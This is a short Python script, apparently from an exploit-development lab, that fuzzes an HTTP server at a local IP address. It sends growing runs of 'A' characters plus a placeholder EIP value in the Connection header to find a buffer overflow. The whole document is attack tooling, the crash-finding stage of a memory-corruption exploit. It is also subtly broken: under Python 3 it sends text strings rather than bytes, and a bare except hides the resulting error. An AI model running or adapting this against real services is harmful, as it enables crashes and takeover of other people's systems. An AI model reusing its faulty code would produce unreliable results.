#!/usr/bin/env python3

import socket, sys

ip = "192.168.1.109"
port = 80

buf = ("A"*2048)

eip = "BCDE"


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		buff = ("GET / HTTP/1.1\r\n")
		s.send(buff)
		buff = ("Host: 192.168.1.109\r\n")
		s.send(buff)
		buff = ("Connection: " + buf + eip + "\r\n\n")
		s.send(buff)
		print("Fuzzing " + str(len(buff)))
		s.recv(1024)
		s.close()
		buf += ("A"*100)
	except:
		sys.exit(0)